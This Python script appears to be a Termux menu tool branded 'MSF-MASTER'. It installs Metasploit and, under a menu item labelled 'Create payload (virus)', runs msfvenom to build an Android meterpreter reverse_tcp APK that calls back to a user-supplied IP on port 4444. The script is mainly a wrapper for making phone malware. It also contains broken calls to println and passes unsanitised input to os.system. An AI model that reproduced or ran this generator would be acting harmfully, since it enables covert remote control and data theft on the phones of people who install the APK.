import os
import sys


while True:
 
 print("\x1b[31m __  __ ____  _____     __  __    _    ____ _____ _____ ___    ")
 print("|  \/  / ___||  ___|   |  \/  |  / \  / ___|_   _| ____|  _ \  ")
 print("| |\/| \___ \| |_ _____| |\/| | / _ \ \___ \ | | |  _| | |_) | ")
 print("| |  | |___) |  _|_____| |  | |/ ___ \ ___) || | | |___|  _ <  ")
 print("|_|  |_|____/|_|       |_|  |_/_/   \_\____/ |_| |_____|_| \_\ ")
 print("\x1b[37m-------------------------")
 print("[1]Install metasploit")
 print("[2]Functions")
 print("[3]Exit")
 print("-------------------------")

 vibor = int(input("\x1b[33m[*]Select: "))
 print("\x1b[37m-------------------------")

 if vibor == 1:
     os.system("pkg install unstable-repo")
     os.system("pkg install metasploit")
     print("[*]Metasploit installed!")
    
    
 elif vibor == 2:
     print("[1]Create payload (virus)")
     print("[2]Back")
     print("-------------------------")
     vibor2 = int(input("\x1b[33m[*]Select: "))
     if vibor2 == 1:
         print("-------------------------")
         ip = input("[*]Your IP: ")
         name = input("[*]Name your payload app: ")
         os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=4444 -o /sdcard/" + name + ".apk")  	
     elif vibor2 == 2:
         break
     else:
         println("\x1b[37m[*]Item does not exist")
         println("sk")
        
        
 elif vibor == 3:
     print("[*]Good luck!")
     break
    
    
 else:
     print("[*]Item does not exist")